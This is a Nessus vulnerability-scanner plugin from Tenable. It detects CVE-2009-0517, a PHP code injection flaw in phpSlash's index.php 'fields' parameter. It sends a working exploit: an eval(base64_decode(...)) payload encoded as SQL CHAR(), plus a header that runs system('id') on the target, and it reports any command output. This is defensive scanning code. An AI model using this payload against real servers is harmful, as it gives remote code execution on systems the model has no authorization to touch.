#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#


if ( NASL_LEVEL < 3000 ) exit(0);

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(35587);
  script_version("1.22");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2009-0517");
  script_bugtraq_id(33572);
  script_xref(name:"EDB-ID", value:"7948");
  script_xref(name:"SECUNIA", value:"33717");

  script_name(english:"phpSlash fields Parameter PHP Code Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows execution
of arbitrary PHP code.");
  script_set_attribute(attribute:"description", value:
"The remote host is running phpSlash, a PHP weblog and content
management system that started out as a port of the Perl code used to
power Slashdot.org. 

The installed version of phpSlash fails to validate user-supplied
input to the 'fields' parameter of the 'index.php' script before using
it to call 'eval()' in the 'tz_env::generic'' method.  Regardless of
PHP's 'register_globals' and 'magic_quotes_gpc' settings, an
unauthenticated attacker can exploit this issue to inject arbitrary
PHP code and execute it on the remote host, subject to the privileges
of the web server user id.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:"CANVAS");
  script_cwe_id(94);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/02/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpslash:phpslash");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");


port = get_http_port(default:80, php:TRUE);


# Command to try to run.
#
# nb: escape any quotes or NULLs.
cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpslash", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to run a command.
  fake_srv = string("NESSUS_CMD");
  exploit = string(
    "1');",
    "eval(base64_decode($_SERVER[HTTP_", fake_srv, "]));//"
  );
  sep = string('----- ', SCRIPT_NAME, ' -----');

  cstr = "CHAR(";
  l = strlen(exploit);
  for (i=0; i<l; i++)
    cstr += ord(exploit[i]) + ",";
  cstr[strlen(cstr)-1] = ")";

  url = string(
    dir, "/index.php?",
    "fields=", cstr, ",1"
  );

  req = http_mk_get_req(
    port        : port,
    item        : url, 
    add_headers : make_array(fake_srv, base64(str:string("echo '", sep, "\n';system('", cmd, "');echo '", sep, "\n';")))
  );
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # it looks like phpSlash and...
    (
      '<!-- START slashHead' >< res[2] ||
      'powered by <a href="http://www.php-slash.org/">phpslash' >< res[2]
    ) &&
    # we see our output separator.
    sep >< res[2]
  )
  {
    if (report_verbosity > 0)
    {
      # If we see the command output...
      if (egrep(pattern:cmd_pat, string:res[2]))
      {
        req_str = http_mk_buffer_from_req(req:req);
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote \n",
          "host using the following request :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          req_str,
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
        if (report_verbosity > 1)
        {
          output = strstr(res[2], sep) - sep;
          output = output - strstr(output, sep);

          report = string(
            report,
            "\n",
            "It produced the following output :\n",
            # nb: there's already an empty line at the start
            "  ", data_protection::sanitize_uid(output:str_replace(find:'\n', replace:'\n  ', string:output)), "\n"
          );
        }
      }
      else
      {
        report = string(
          "\n",
          "Nessus was not able to execute the command '", cmd, "' on the remote host\n",
          "even though the application itself appears vulnerable.  This may be\n",
          "because the command does not exist, is not found in the PATH available\n",
          "to the web server, or a PHP configuration setting prevents the command\n",
          "from being run. You should investigate.\n"
        );
      }

      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
